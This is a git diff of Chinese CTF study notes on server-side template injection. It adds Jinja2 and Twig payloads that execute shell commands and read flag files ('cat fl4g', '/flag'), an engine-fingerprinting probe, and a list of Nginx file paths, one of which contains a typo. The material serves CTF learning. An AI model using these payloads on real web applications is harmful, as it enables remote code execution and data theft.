@@ -1,6 +1,6 @@
 # SSTI
 
-* ### 标准SSTI查询语句
+* ### 标准SSTI查询语句(JinJa2)
 
 ```
 ''.__class__.__base__.__subclasses__() //返回子类列表
@@ -9,6 +9,19 @@
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()  //得到ls结果并打印在页面上
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
 ```
+
+* ### 标准Twig查询语句：
+
+* ```
+  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}   //RCE
+  ```
+
+* Jinjia与Twig区别在于：
+
+* ```
+  {{7*'7'}} 回显7777777 ==> Jinja2
+  {{7*'7'}} 回显49 ==> Twig 
+  ```
 
 * ### SSTI注入
 
@@ -41,6 +54,19 @@ Payload：
 
 
 注入点发现：输入时采用{{1+1}}判断是否存在注入点
+
+
+
+* Nginx 重要文件目录
+
+  配置文件存放目录：/etc/nginx
+  主要配置文件：/etc/nginx/conf/nginx.conf
+  管理脚本：/usr/lib64/systemd/system/nginx.service
+  模块：/usr/lisb64/nginx/modules
+  应用程序：/usr/sbin/nginx
+  程序默认存放位置：/usr/share/nginx/html
+  日志默认存放位置：/var/log/nginx
+  Nginx配置文件：/usr/local/nginx/conf/nginx.conf
 
 
 
